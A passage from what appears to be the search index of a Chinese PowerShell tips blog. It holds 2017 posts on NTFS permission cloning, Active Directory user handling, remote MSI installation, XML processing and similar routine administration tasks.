CIID;FA;;;BA)(A;OICIID;FA;;;S-1-5-21-2012478179-265285931-690539891-1001)... 免责声明：这里呈现的所有代码仅供学习使用。由于我们没有投入大量精力去测试它，所以没有任何保障，而且它并不是生产准备就绪的代码。您有责任对这段代码进行测试，并决定它是否完美符合您的需要。","link":"/2017/04/27/cloning-folder-structures-with-ntfs-permissions-part-1/"},{"title":"PowerShell 技能连载 - 克隆文件夹结构（含 NTFS 权限） – 第二部分","text":"在前一个技能中我们演示了 Get-FolderStructureWithPermission 如何以结构化的形式记录并创建一个包含所有嵌套文件夹的清单，包含它们各自的 NTFS 安全设置。结果可以保存到一个变量中，或用 Export-Csv 序列化后保存到磁盘中。 今天我们演示第二部分：当您拥有一个指定文件夹结构的信息之后，可以使用这个 Set-FolderStructureWithPermission。它输入一个要克隆其结构的文件夹路径，加上通过 Get-FolderStructureWithPermission 获得的结构信息： 1234567891011121314151617181920212223242526272829#requires -RunAsAdministratorfunction Set-FolderStructureWithPermission{ param ( [String] [Parameter(Mandatory)] $Path, [Object[]] $folderInfo ) $folderInfo | ForEach-Object { $relativePath = $_.Path $sddl = $_.SDDL $newPath = Join-Path -Path $Path -ChildPath $relativePath $exists = Test-Path -Path $newPath if ($exists -eq $false) { $null=New-Item -Path $newPath -ItemType Directory -Force } $sd = Get-Acl -Path $newPath $sd.SetSecurityDescriptorSddlForm($sddl) Set-Acl -Path $newPath -AclObject $sd }} 由于设置 NTFS 权限的需要，这个函数需要管理员特权才能运行。 免责声明：这里呈现的所有代码仅供学习使用。由于我们没有投入大量精力去测试它，所以没有任何保障，而且它并不是生产准备就绪的代码。您有责任对这段代码进行测试，并决定它是否完美符合您的需要。 一个典型的用例是克隆一个现有的文件夹结构： 123# clone user profile$infos = Get-FolderStructureWithPermission -Path $homeSet-FolderStructureWithPermission -Path c:\\CloneHere -folderInfo $infos","link":"/2017/04/28/cloning-folder-structures-with-ntfs-permissions-part-2/"},{"title":"PowerShell 技能连载 - 将 AD 用户转为哈希表","text":"有些时候从一个指定的 AD 用户读取所有属性到一个哈希表中十分有用。通过这种方法，您可以编辑他们，并使用 Set-ADUser 和它的 -Add 或 -Replace 参数将他们应用于另一个用户账户。 以下是将所有 AD 用户属性读到一个哈希表中的方法： 12345678910111213141516#requires -Version 3.0 -Modules ActiveDirectory$blacklist = 'SID', 'LastLogonDate', 'SAMAccountName'$user = Get-ADUser -Identity NAMEOFUSER -Properties *$name = $user | Get-Member -MemberType *property | Select-Object -ExpandProperty Name$hash = [Ordered]@{}$name | Sort-Object | Where-Object { $_ -notin $blacklist } | ForEach-Object { $hash[$_] = $user.$_} 请注意 $blacklist 的使用：这个列表可以包含任何希望排除的属性名。","link":"/2017/05/01/turning-ad-user-into-a-hash-table/"},{"title":"PowerShell 技能连载 - 用 Out-GridView 启用 AD 用户","text":"有些时候在 PowerShell 中只需要几行代码就可以创造出很有用的支持工具。以下是一个显示所有禁用的 AD 用户的例子。您可以选择一个（或按住 CTRL 键选择多个），然后点击 OK，这些用户将会被启用： 12345#requires -Version 3.0 -Modules ActiveDirectorySearch-ADAccount -AccountDisabled | Out-GridView -Title 'Who should be enabled?' -OutputMode Multiple | # remove -WhatIf to actually enable accounts Enable-ADAccount -WhatIf","link":"/2017/05/02/enable-ad-users-with-out-gridview/"},{"title":"PowerShell 技能连载 - 翻译错误记录","text":"Whenever PowerShell records an error, it wraps it in an Error Record object. Here is a function that takes such an error record and extracts the useful information:当 PowerShell 记录一个错误时，它将错误信息包装在一个 Error Record 对象中。以下是一个处理这种错误记录并解析有用信息的函数： 12345678910111213141516171819202122232425#requires -Version 3.0function Get-ErrorDetail{ param ( [Parameter(Mandatory,ValueFromPipeline)] $e ) process { if ($e -is [Management.Automation.ErrorRecord]) { [PSCustomObject]@{ Reason = $e.CategoryInfo.Reason Exception = $e.Exception.Message Target = $e.CategoryInfo.TargetName Script = $e.InvocationInfo.ScriptName Line = $e.InvocationInfo.ScriptLineNumber Column = $e.InvocationInfo.OffsetInLine Datum = Get-Date User = $env:USERNAME } } }} 如果您想知道最后的错误信息是什么，请试试这个： 123PS C:\\&gt; $error | Get-ErrorDetail | Out-GridViewPS C:\\&gt; 或者，您现在可以简单地命令一个 cmdlet 缓存它的错误信息，并在晚些时候处理它们。这个例子递归地在 Windows 文件夹中搜索 PowerShell 脚本。您可以获取结果，以及搜索时发生的所有错误的详细信息： 123$files = Get-ChildItem -Path c:\\Windows -Filter *.ps1 -Recurse -ErrorAction SilentlyContinue -ErrorVariable myErrors$myErrors| Get-ErrorDetail | Out-GridView","link":"/2017/05/03/translating-error-records/"},{"title":"PowerShell 技能连载 - 批量打印 Word 文档","text":"这行代码将在您的配置文件中查找所有 Word 文档： 1Get-ChildItem -Path $home -Filter *.doc* -Recurse If you’d like, you can easily print them all. Here is how:如果需要，可以将它们全部打印出来。以下是具体方法： 1234Get-ChildItem -Path $home -Filter *.doc* -Recurse | ForEach-Object { Start-Process -FilePath $_.FullName -Verb Print -Wait } 它最重要的部分是 -Wait 参数：如果缺少了它，PowerShell 将会同时启动多个 Word 的实例，并行打印所有文档。这将耗尽您系统的资源。使用 -Wait 参数以后，PowerShell 将等待前一个 Word 打印完之后再启动下一个实例。","link":"/2017/05/05/bulk-printing-word-documents/"},{"title":"PowerShell 技能连载 - 从德国媒体数据库下载视频","text":"在德国，有一些公开的媒体数据库，里面有公共站点发布的电视内容。只需要用一小段 PowerShell 代码就可以解析 JSON 数据，在一个列表中显示电视节目，并使你能够选择某项来下载。 请注意包含下载链接的 JSON 文件非常大，所以需要过一段时间才能显示出视频列表。 12345678910111213141516171819202122232425262728#requires -Version 3.0# here is the list of download URLs - get it and# convert the JSON format$url = 'http://www.mediathekdirekt.de/good.json'$web = Invoke-WebRequest -Uri $url -UseBasicParsing$videos = $web.Content | ConvertFrom-Json# get all videos, create a nice title to display,# and attach the original data to each entry$videos |ForEach-Object { $title = '{0} - {1}' -f $_[2], $_[5] $title | Add-Member -MemberType NoteProperty -Name Data -Value $_ -PassThru} |Sort-Object |Out-GridView -Title 'Video' -OutputMode Multiple |ForEach-Object { # get the actual download info from the selected videos # and do the download $url = $_.Data[6] $filename = Split-Path -Path $url -Leaf # videos are saved into your TEMP folder unless you # specify a different folder below $filepath = Join-Path -Path $env:temp -ChildPath $filename Invoke-WebRequest -Uri $url -OutFile $filepath -UseBasicParsing Invoke-Item -Path $filepath}","link":"/2017/05/05/downloading-videos-from-german-media-databases/"},{"title":"PowerShell 技能连载 - HTML 编码","text":"有一个 .NET 的静态方法可以对一段文本进行 HTML 编码，例如如果您希望在 HTML 输出中正常显示一段文本： 12PS&gt; [System.Web.HttpUtility]::HtmlEncode('Österreich heißt so.')&amp;#214;sterreich hei&amp;#223;t so.","link":"/2017/05/08/html-encoding/"},{"title":"PowerShell 技能连载 - HTML 高级编码","text":".NET 静态方法 HtmlEncode 能够较好地将普通字符进行编码，但是对于许多特殊字符会处理失败。要正确地对所有字符编码，我们编写了一个 ConvertTo-EncodedHtml 函数： 1234567891011121314151617181920function ConvertTo-EncodedHTML($HtmlText){ $chars = [Web.HttpUtility]::HtmlEncode($HtmlText).ToCharArray() $txt = New-Object System.Text.StringBuilder $null = . { foreach($c in $chars) { if ([int]$c -gt 127) { $txt.Append(&quot;&amp;#&quot; + [int]$c + &quot;;&quot;) } else { $txt.Append($c) } } } return $txt.ToString()} 这个函数检查所有 ASCII 代码大于 127 的字符并将这些字符转换为编码后的版本： 12PS&gt; Convert-EncodedHTML -HtmlText &quot;A – s ‘Test’&quot;A &amp;#8211; s &amp;#8216;Test&amp;#8217;","link":"/2017/05/09/html-encoding-advanced/"},{"title":"PowerShell 技能连载 - .Replace() 和 -replace 的区别","text":"有两种方法可以替换一个字符串中的问本：Replace() 方法，和 -replace 操作符。它们的工作机制是不同的。 Replace() 是大小写敏感的，能够将文本替换为新的文本： 12345PS&gt; 'Hello World.'.Replace('o', '0')Hell0 W0rldPS&gt; 'Hello World.'.Replace('ell','oo')Hooo World -replace 操作符缺省是大小写不敏感的（如果希望大小写敏感，请使用 -creplace）。它接受一个正则表达式输入，很多人忽略了这个功能： 12345PS&gt; 'Hello World.' -replace 'ell', 'oo'Hooo World.PS&gt; 'Hello World.' -replace '.', '!'!!!!!!!!!!!! 第二个输出会让不了解正则表达式的人感到惊讶。如果您希望用 -replace 来替换静态文本，请确保对文本进行转义： 12PS&gt; 'Hello World.' -replace [Regex]::Escape('.'), '!'Hello World!","link":"/2017/05/10/how-replace-and-replace-differ/"},{"title":"PowerShell 技能连载 - 在远程系统中安装 MSI","text":"以下是一些或许对您有用的代码。您需要远程系统的管理员权限。 12345$ComputerName = 'NameOfMachineToInstall'$TargetPathMSI = '\\\\softwareserver\\product\\package.msi'$class = [wmiclass]&quot;\\\\$ComputerName\\ROOT\\cimv2:Win32_Product&quot;$class.Install($TargetPathMSI) 如果权限和网络连接允许，这段代码将在远程系统中安装一个 MSI 包。请在开始之前调整好变量。第一个是需要安装 MSI 的机器名称。第二个是需要安装的 MSI 路径。","link":"/2017/05/11/installing-msi-on-remote-system/"},{"title":"PowerShell 技能连载 - 使用剪贴板来传输数据和结果","text":"终于，在 PowerShell 5 中原生支持将结果发送到剪贴板中，以及从剪贴板中接收结果： 123456PS&gt; Get-Command -Noun ClipboardCommandType Name Version Source----------- ---- ------- ------Cmdlet Get-Clipboard 3.1.0.0 Microsoft.PowerShell.ManagementCmdlet Set-Clipboard 3.1.0.0 Microsoft.PowerShell.Management 例如，您可以打开一个包含一些数据的 Excel 表格，将一列复制到剪贴板中，然后在 PowerShell 中进一步处理数据，例如过滤它： 1PS&gt; $list = (Get-ClipBoard) -like '*err*'","link":"/2017/05/12/using-clipboard-to-transfer-data-and-results/"},{"title":"PowerShell 技能连载 - 将二进制字符串转为整形","text":"以下是将一段二进制文本字符串转为对应的整形值的方法： 123$binary = &quot;110110110&quot;$int = [Convert]::ToInt32($binary,2)$int 用另一种方法可以更简单： 12PS&gt; [Convert]::ToString(438,2)110110110","link":"/2017/05/15/converting-binary-string-to-integer/"},{"title":"PowerShell 技能连载 - 按位移位","text":"PowerShell 包含许多不太常用的二进制操作符，例如按位移位。-shl 操作符按位左移指定的位数： 12345678PS&gt; 1 -shl 12PS&gt; 2 -shl 14PS&gt; 3 -shl 16","link":"/2017/05/16/bitwise-shift/"},{"title":"PowerShell 技能连载 - 创建随机的 MAC 地址","text":"如果您只是需要一系列随机生成的 MAC 地址，而不关心这些地址是否合法，以下是一行实现代码： 1234567PS&gt; (0..5 | ForEach-Object { '{0:x}{1:x}' -f (Get-Random -Minimum 0 -Maximum 15),(Get-Random -Minimum 0 -Maximum 15)}) -join ':'a5:66:07:6d:d9:18PS&gt; (0..5 | ForEach-Object { '{0:x}{1:x}' -f (Get-Random -Minimum 0 -Maximum 15),(Get-Random -Minimum 0 -Maximum 15)}) -join ':'3c:c8:4e:e3:75:6c 将它加到一个循环中，就可以生成任意多个 MAC 地址： 12345678PS&gt; 0..100 | ForEach-Object { (0..5 | Foreach-Object { '{0:x}{1:x}' -f (Get-Random -Minimum 0 -Maximum 15),(Get-Random -Minimum 0 -Maximum 15)}) -join ':' }bc:38:3a:91:a9:7936:55:3a:a0:3d:c46d:2c:91:ae:01:35ec:01:11:42:a7:09e7:0b:24:d3:14:1d(...)","link":"/2017/05/17/creating-random-mac-addresses/"},{"title":"PowerShell 技能连载 - 验证整形变量","text":"您可以在一个变量前简单地加上 [Int] 来确保它只包含数字位。但您是否知道从 PowerShell 4.0 开始，支持正则表达式的验证器呢？ 通过这种方式，您可以定义一个变量只能为 2 位至 6 位的正数，或其它指定的模式： 123456789101112PS&gt; [ValidatePattern('^\\d{2,6}$')][int]$id = 666PS&gt; $id = 10000PS&gt; $id = 1000000Cannot check variable id. Value 1000000 is invalid for variable id.PS&gt; $id = 10PS&gt; $id = 1Cannot check variable id. Value 1 is invalid for variable id.","link":"/2017/05/18/validating-integer-variables/"},{"title":"PowerShell 技能连载 - 转义通配符","text":"当您使用 -like 操作符时，它支持三种通配符：”*“ 代表所有数字和字母，”?“ 代表任意单个字符，”[a-z]“ 代表字符的列表。另外有一个不太为人所知的，它支持 PowerShell 的转义字符 “```”，可以用它来转义通配符。 所以当您需要检查一个字符串中的 “*“ 字符，这行代码能够工作但实际上是错的： 1'*abc' -like '*abc' 这是错的，因为它在这种情况下也是返回 true： 1'xyzabc' -like '*abc' 由于您希望检查 “*“ 字符并且不希望将它解释为一个通配符，所以需要对它进行转义： 12345PS&gt; '*abc' -like '`*abc'TruePS&gt; 'xyzabc' -like '`*abc'False 而且如果您使用双引号，请不要忘了对转义符转义： 123456789101112# wrong:PS&gt; &quot;xyzabc&quot; -like &quot;`*abc&quot;True# correct:PS&gt; &quot;xyzabc&quot; -like &quot;``*abc&quot;FalsePS&gt; &quot;*abc&quot; -like &quot;``*abc&quot;TruePS&gt;","link":"/2017/05/19/escape-wildcards/"},{"title":"PowerShell 技能连载 - 请注意 ToString() 方法","text":"任何 .NET 对象都有一个 ToString() 方法，返回的是一段文字描述。这也是当您将一个对象输出为一个字符串时所得到的内容。然而，ToString() 所返回的值可能会改变，所以您永远不要使用它来做一些重要的事情。 Here is an example – these lines both produce a FileInfo object which represents the exact same file. Only the way how the object was created is different. All object properties are identical. Yet, ToString() differs:以下是一个例子——这两行代码都会创建一个 FileInfo 对象，来代表同一个文件。只是创建对象的方法有所不同。所有的对象属性都相同。然而，ToString() 的结果不同： 1234567891011121314PS&gt; $file1 = Get-ChildItem $env:windir -Filter regedit.exePS&gt; $file2 = Get-Item $env:windir\\regedit.exe$file1.FullName; $file2.FullNameC:\\WINDOWS\\regedit.exeC:\\WINDOWS\\regedit.exePS&gt; $file1.GetType().FullName; $file2.GetType().FullNameSystem.IO.FileInfoSystem.IO.FileInfoPS&gt; $file1.ToString(); $file2.ToString()regedit.exeC:\\WINDOWS\\regedit.exe","link":"/2017/05/22/careful-with-tostring/"},{"title":"PowerShell 技能连载 - 冒充 ToString() 方法","text":"在前一个技能当中我们解释了 ToString() 描述一个对象的方法是含糊的，而且对象的作者可以决定 ToString() 返回什么。这在 PowerShell 代码中尤为明显。请看要覆盖任意一个对象的 ToString() 方法是多么容易： 12345678PS&gt; $a = 1PS&gt; $a | Add-Member -MemberType ScriptMethod -Name toString -Value { 'go away' } -ForcePS&gt; $ago awayPS&gt; $a.GetType().FullNameSystem.Int32PS&gt; $a -eq 1True","link":"/2017/05/23/tostring-masquerade/"},{"title":"PowerShell 技能连载 - 生成随机密码","text":"以下是一个非常简单的创建复杂随机密码的方法： 1234Add-Type -AssemblyName System.Web$PasswordLength = 12$SpecialCharCount = 3[System.Web.Security.Membership]::GeneratePassword($PasswordLength, $SpecialCharCount) The API call lets you choose the length of the password, and the number of non-alphanumeric characters it contains.","link":"/2017/05/24/generating-random-password/"},{"title":"PowerShell 技能连载 - 搜索 AD 用户","text":"免费的 Microsoft RSAT 工具给我们带来了 “ActiveDirectory” PowerShell module：许多 cmdlet 可以帮助您管理 Active Directory 用户和计算机。 一个 cmdlet 特别有用。与其使用 Get-ADUser 和复杂得过滤器来查找 AD 用户，我们可以使用更方便的 Search-ADAccount。它注重于某些公共场景的查找用户功能。例如这行代码可以找出所有 120 天未活跃的用户账户： 1Search-ADAccount -AccountInactive -TimeSpan 120 -UsersOnly","link":"/2017/05/25/searching-for-adusers/"},{"title":"PowerShell 技能连载 - 克隆 DHCP 服务器设置","text":"从 Windows Server 2012 开市，您可以快速地导出和重新导入 DHCP 设置。克隆或迁移 DHCP 服务器是通过快照的形式。以下的例子从 \\ORIGDHCP 导出设置并导入本地的 DHCP 服务器中： 12Export-DHCPServer -File &quot;$env:temp\\dhcpsettings.xml&quot; -Computername ORIGDHCPImport-DHCPServer -File &quot;$env:temp\\dhcpsettings.xml&quot;","link":"/2017/05/26/cloning-dhcp-server-settings/"},{"title":"PowerShell 技能连载 - 验证变量有效性","text":"变量和函数参数可以通过验证属性自动地验证有效性。以下是一个简单的例子，确保 $test1 只能存储 1-10 之间的值： 1[ValidateRange(1,10)]$test1 = 10 当您将一个小于 1 或大于 10 的值赋给这个变量，PowerShell 将会抛出一个异常。不过通过这种方式您无法控制异常的问本。 通过使用脚本验证器，您可以选择自己希望的错误信息： 12345678[ValidateScript({If ($_ -gt 10){ throw 'You have submitted a value greater than 10. That will not work, dummy!' }Elseif ($_ -lt 1){ throw 'You have submitted a value lower than 1. That will not work, dummy!' }$true})]$test2 = 10 以下是输出结果： 123456789101112131415161718192021PS C:\\&gt; $test2 = 4PS C:\\&gt; $test2 = 11You have submitted a value greater than 10. That will not work, dummy!At line:5 char:3+ { throw 'You have submitted a value greater than 10. That will not work, dummy ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : OperationStopped: (You have submitted a...not work, dummy!:String ) [], RuntimeException + FullyQualifiedErrorId : You have submitted a value greater than 10. That will not work, dummy!PS C:\\&gt; $test2 = -2You have submitted a value lower than 1. That will not work, dummy!At line:7 char:3+ { throw 'You have submitted a value lower than 1. That will not work, dummy ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : OperationStopped: (You have submitted a...not work, dummy!:String ) [], RuntimeException + FullyQualifiedErrorId : You have submitted a value lower than 1. That will not work, dummy!","link":"/2017/05/29/validating-variables/"},{"title":"PowerShell 技能连载 - 测试 OU","text":"假设您已安装了免费的 Microsoft RSAT 工具，以下是一个简单的方法来检测一个 OU 是否存在： 123$OUPath = 'OU=TestOU,DC=train,DC=powershell,DC=local'$exists = $(try { Get-ADOrganizationalUnit -Identity $OUPath -ErrorAction Ignore } catch{}) -ne $null&quot;$OUPath : $exists&quot; $exits 的值将是 $true 或 $false，表示是否找到该 OU。请注意使用 try/catch 处理错误的方法：Get-ADOrganizationalUnit 将在指定的 OU 不存在时抛出终止错误，所以需要 try/catch 来捕获这些错误。","link":"/2017/05/30/testing-organizational-unit/"},{"title":"PowerShell 技能连载 - 查找 OU","text":"（来自 Microsoft 免费的 RSAT 工具的）Get-OrganizationalUnit 可以基于识别名或 GUID 来搜索 OU，或者可以使用 -Filter 参数。 不幸的是，-Filter 不能方便地自动化。以下代码并不能工作，并不能返回所有名字中包含 “Test” 的 OU： 12$Name = 'Test'Get-ADOrganizationalUnit -Filter { Name -like &quot;*$Name*&quot; } 这个结果很令人惊讶，因为以下这行代码可以工作（前提是您确实有名字包含 “Test” 的 OU）： 1Get-ADOrganizationalUnit -Filter { Name -like &quot;*Test*&quot; } 通常情况下，如果您想用简单的通配符来搜索，那么使用简单的 LDAP 过滤器十分管用。以下代码查找所有名字中包含 “Test” 的 OU： 12$Name = 'Test'Get-ADOrganizationalUnit -LDAPFilter &quot;(Name=*$Name*)&quot;","link":"/2017/05/31/finding-organizational-units/"},{"title":"PowerShell 技能连载 - 安全地删除数据","text":"要安全地删除文件、文件夹，或整个驱动器，PowerShell 可以使用内置的 cipher.exe 工具。这行代码可以安全地删除旧的用户配置文件： 1Cipher.exe /w:c:\\Users\\ObsoleteUser 请注意要删除的文件夹路径和参数 /w 之间需要用一个 : 分隔。删除数据需要消耗一定时间：Windows 要多次覆盖整个数据内容，以确保它不可恢复。","link":"/2017/06/01/safely-deleting-data/"},{"title":"用 PowerShell 查看安装的 .NET 框架","text":"以下 PowerShell 代码最高支持 .NET 4.7 版本： 123456789101112131415161718Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse |Get-ItemProperty -name Version,Release -EA 0 |Where { $_.PSChildName -match '^(?!S)\\p{L}'} |Select PSChildName, Version, Release, @{ name=&quot;Product&quot; expression={ switch -regex ($_.Release) { &quot;378389&quot; { [Version]&quot;4.5&quot; } &quot;378675|378758&quot; { [Version]&quot;4.5.1&quot; } &quot;379893&quot; { [Version]&quot;4.5.2&quot; } &quot;393295|393297&quot; { [Version]&quot;4.6&quot; } &quot;394254|394271&quot; { [Version]&quot;4.6.1&quot; } &quot;394802|394806&quot; { [Version]&quot;4.6.2&quot; } &quot;460798&quot; { [Version]&quot;4.7&quot; } {$_ -gt 460798} { [Version]&quot;Undocumented 4.7 or higher, please update script&quot; } } }} 参考： How to: Determine Which .NET Framework Versions Are Installed PowerShell script to return versions of .NET Framework on a machine? - Stack Overflow","link":"/2017/06/02/Use-Powershell-to-Return-Versions-of-NET-Framework-on-a-Machine/"},{"title":"PowerShell 技能连载 - 映射网络驱动器","text":"PowerShell 提供很多种方式来连接到 SMB 文件共享。以下是三种不同的方法： 123456# adjust path to point to your file share$UNCPath = '\\\\server\\share'net use * $UNCPathNew-PSDrive -Name y -PSProvider FileSystem -Root $UNCPath -PersistNew-SmbMapping -LocalPath 'x:' -RemotePath $UNCPath Net.exe 是最多功能的方法，在 PowerShell 的所有版本中都有效。通过传入一个 “*”，它自动选择下一个有效的驱动器盘符。 New-PSDrive 从 PowerShell 3 起支持 SMB 共享。New-SmbMapping 需要 SmbShare 模块并且现在看来有点古怪：重启后才能在 Windows Explorer 中显示该驱动器。","link":"/2017/06/02/mapping-network-drives/"},{"title":"掌握 PowerShell 的 XML 日常操作","text":"PowerShell 处理 XML 之葵花宝典PowerShell 对 XML 的支持非常酷。这篇文章整理了所有日常的 XML 任务，甚至非常复杂的任务，都可以轻松搞定。 我们从一个简单的例子开始，以免把脑子搞乱。 我们先创建一个 XML 文档，然后加入数据集合，改变一些信息，增加新数据，删除数据，最后将修改好的版本保存为一个格式化过的 XML 文件。 新建 XML 文档从头开始创建新的 XML 文档是一件很乏味的事。许多写脚本的人干脆以纯文本的方式来创建 XML 文件。虽然这样也可以，但是容易出错。这样很有可能拼写错误导致问题，而且您会发现自己身处一个和 XML 很不友好的世界里。 其实不然，只要用 XMLTextWriter 对象就可以创建 XML 文档了。这个对象屏蔽了处理原生 XML 对象模型的细节，并且帮您将信息写入 XML 文件。 开始之前，我们用下面的代码创建一个 TMD 复杂的 XML 文档来玩。这段代码的目的是创建一个包含所有典型内容的 XML 文档，包括节点、属性、数据区、注释。 # 这是文档存储的路径: $Path = &quot;$env:temp\\inventory.xml&quot; # 新建一个 XMLTextWriter 来创建 XML: $XmlWriter = New-Object System.XMl.XmlTextWriter($Path,$Null) # 设置排版参数: $xmlWriter.Formatting = 'Indented' $xmlWriter.Indentation = 1 $XmlWriter.IndentChar = &quot;`t&quot; # 写入头部: $xmlWriter.WriteStartDocument() # 声明 XSL $xmlWriter.WriteProcessingInstruction(&quot;xml-stylesheet&quot;, &quot;type='text/xsl' href='style.xsl'&quot;) # 创建根对象“machines”，并且添加一些属性 $XmlWriter.WriteComment('List of machines') $xmlWriter.WriteStartElement('Machines') $XmlWriter.WriteAttributeString('current', $true) $XmlWriter.WriteAttributeString('manager', 'Tobias') # 加入一些随机的节点 for($x=1; $x -le 10; $x++) { $server = 'Server{0:0000}' -f $x $ip = '{0}.{1}.{2}.{3}' -f (0..256 | Get-Random -Count 4) $guid = [System.GUID]::NewGuid().ToString() # 每个数据集的名字都是“machine”，并且增加一个随机的属性： $XmlWriter.WriteComment(&quot;$x. machine details&quot;) $xmlWriter.WriteStartElement('Machine') $XmlWriter.WriteAttributeString('test', (Get-Random)) # 增加三条信息： $xmlWriter.WriteElementString('Name',$server) $xmlWriter.WriteElementString('IP',$ip) $xmlWriter.WriteElementString('GUID',$guid) # 增加一个含有属性和正文的节点： $XmlWriter.WriteStartElement('Information') $XmlWriter.WriteAttributeString('info1', 'some info') $XmlWriter.WriteAttributeString('info2', 'more info') $XmlWriter.WriteRaw('RawContent') $xmlWriter.WriteEndElement() # 增加一个含有 CDATA 段的节点： $XmlWriter.WriteStartElement('CodeSegment') $XmlWriter.WriteAttributeString('info3', 'another attribute') $XmlWriter.WriteCData('this is untouched code and can contain special characters /\\@&lt;&gt;') $xmlWriter.WriteEndElement() # 关闭“machine”节点： $xmlWriter.WriteEndElement() } # 关闭“machines”节点： $xmlWriter.WriteEndElement() # 完成整个文档： $xmlWriter.WriteEndDocument() $xmlWriter.Flush() $xmlWriter.Close() notepad $path 这段脚本用随机数据生成了一个虚拟的服务器进货单。结果自动用记事本，看起来如下： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;?xml-stylesheet type='text/xsl' href='style.xsl'?&gt; &lt;!--List of machines--&gt; &lt;Machines current=&quot;True&quot; manager=&quot;Tobias&quot;&gt; &lt;!--1. machine details--&gt; &lt;Machine test=&quot;578163632&quot;&gt; &lt;Name&gt;Server0001&lt;/Name&gt; &lt;IP&gt;31.248.95.170&lt;/IP&gt; &lt;GUID&gt;51cb0dfb-75ed-4967-8392-47d87596c73c&lt;/GUID&gt; &lt;Information info1=&quot;some info&quot; info2=&quot;more info&quot;&gt;RawContent&lt;/Information&gt; &lt;CodeSegment info3=&quot;another attribute&quot;&gt;&lt;![CDATA[this is untouched code and can contain special characters /\\@&lt;&gt;]]&gt;&lt;/CodeSegment&gt; &lt;/Machine&gt; &lt;!--2. machine details--&gt; &lt;Machine test=&quot;124214010&quot;&gt; &lt;Name&gt;Server0002&lt;/Name&gt; &lt;IP&gt;33.60.233.89&lt;/IP&gt; &lt;GUID&gt;9618b8bc-c200-46ce-b423-ee030555242d&lt;/GUID&gt; &lt;Information info1=&quot;some info&quot; info2=&quot;more info&quot;&gt;RawContent&lt;/Information&gt; &lt;CodeSegment info3=&quot;another attribute&quot;&gt;&lt;![CDATA[this is untouched code and can contain special characters /\\@&lt;&gt;]]&gt;&lt;/CodeSegment&gt; &lt;/Machine&gt; (...) &lt;/Machines&gt; 这个 XML 文档有两个目的：一是提供了一个创建 XML 文件的代码模板二是为接下来的练习提供一个基础数据。 我们假想这个 XML 文件有重要的信息在里面，接下来要用各种方法来操作这个规范的 XML 文件。 注意：XMLTextWriter 做了很多智能的事情，不过你需要确保你创建的内容没问题。比如说一个常见的问题是节点名称非法。节点名称不得含有空格。 所以写成 CodeSegment 是正确的，而 Code Segment 是错误的。XML 将会试着将节点命名为 Code，然后增加一个名为 Segment 的属性，最后因为没有为属性设置值而出错。 查找 XML 文件中的信息一个常见的任务是从 XML 文件中提取信息。我们假设您需要获得一个机器和 IP 地址的列表。加入您已经生成了上述的 XML 文件，那么以下是创建一个报告要做的所有事情： # 这是 XML 例子文件的存储路径： $Path = &quot;$env:temp\\inventory.xml&quot; # 将它加载入 XML 对象： $xml = New-Object -TypeName XML $xml.Load($Path) # 注意：如果 XML 格式是非法的，这里会报异常 # 一定要注意节点名不能包含空格 # 只需要在节点中自由遍历，就能 select 获得您要的信息： $Xml.Machines.Machine | Select-Object -Property Name, IP 结果大概是这样： Name IP ---- -- Server0001 31.248.95.170 Server0002 33.60.233.89 Server0003 226.6.1.30 Server0004 139.30.8.110 Server0005 94.104.253.8 Server0006 202.80.178.61 Server0007 22.217.227.159 Server0008 253.72.25.212 Server0009 233.147.116.60 Server0010 41.173.220.129 注意：有些人奇怪我为什么不直接用 XML 对象。这段是你们常见的代码： # 这是 XML 例子文件的存储路径： $Path = &quot;$env:temp\\inventory.xml&quot; # 将它读入一个 XML 对象： [XML]$xml = Get-Content $Path 原因是性能问题。通过 Get-Content 将 XML 以纯文本文件的方式读入，第二步再将它转换为 XML 是一个非常消耗性能的过程。虽然我们的 XML 文件不算大，后面的方式也要比第一种方式消耗多大约 7 倍的时间，而且随着 XML 文件的增大，性能差异会更明显。 所以建议在任何读取 XML 文件的时候，都先创建 XML 对象，并调用它的 Load() 方法。这个方法能够智能地接受 URL，所以您也可以用 RSS feed 的 URL 地址（假设有现成的 Internet 连接，并且不需要设置代理服务器）。 筛选特定的内容假设您不想要整个服务器列表，而只是想要列表中某台服务器的 IP 地址以及 info1 属性。你可以用类似这样的代码： $Xml.Machines.Machine | Where-Object { $_.Name -eq 'Server0009' } | Select-Object -Property IP, {$_.Information.info1} 这段代码将获取 server0009 的 IP 地址以及 info1 属性。您也可以不用在客户端过滤所有的元素，可以用 XPath（一种 XML 查询语言）来做： $item = Select-XML -Xml $xml -XPath '//Machine[Name=&quot;Server0009&quot;]' $item.Node | Select-Object -Property IP, {$_.Information.Info1} 这段 XPath 查询语句 //Machine[Name=&quot;Server0009&quot;] 在所有的 Machine 节点中查找含有 Name 子节点，且它的值为 _Server009_。 强调: XPath 是大小写敏感的，所以如果节点名称是 _Machine_，那么您不能用 machine 来查询。 另外说一句，在这两种写法里，您都会用到脚本块来读写属性，这是因为 “info1” 属性是 “Information” 子节点的一部分。在这类场景中，您可以用哈希表来更好地呈现它的名字： $info1 = @{Name='AdditionalInfo'; Expression={$_.Information.Info1}} $item = Select-XML -Xml $xml -XPath '//Machine[Name=&quot;Server0009&quot;]' $item.Node | Select-Object -Property IP, $info1 结果看起来如下： IP AdditionalInfo -- -------------- 97.196.140.12 some info XPath 是非常强大的 XML 查询语言。您在网上到处都可以找到它的语法介绍（比如这些链接：http://www.w3schools.com/xpath/ 和 http://go.microsoft.com/fwlink/?LinkId=143609）。当您阅读这些文档的时候，您会发现 XPath 可以使用一些称为“用户定义函数”的东西，比如 last() 和 lowercase()。这里不支持这些函数。 改变 XML 内容您常常需要更改 XML 文档的内容。与其手工解析 XML 文档，不如用上刚刚学到的技术。 假设您想修改 Server0006 并且为它赋值一个新的名称和一个新的 IP 地址，需要做以下事情： $item = Select-XML -Xml $xml -XPath '//Machine[Name=&quot;Server0006&quot;]' $item.node.Name = &quot;NewServer0006&quot; $item.node.IP = &quot;10.10.10.12&quot; $item.node.Information.Info1 = 'new attribute info' $NewPath = &quot;$env:temp\\inventory2.xml&quot; $xml.Save($NewPath) notepad $NewPath 如您所见，修改信息十分简单，所有做出的改变会自动反映到相应的 XML 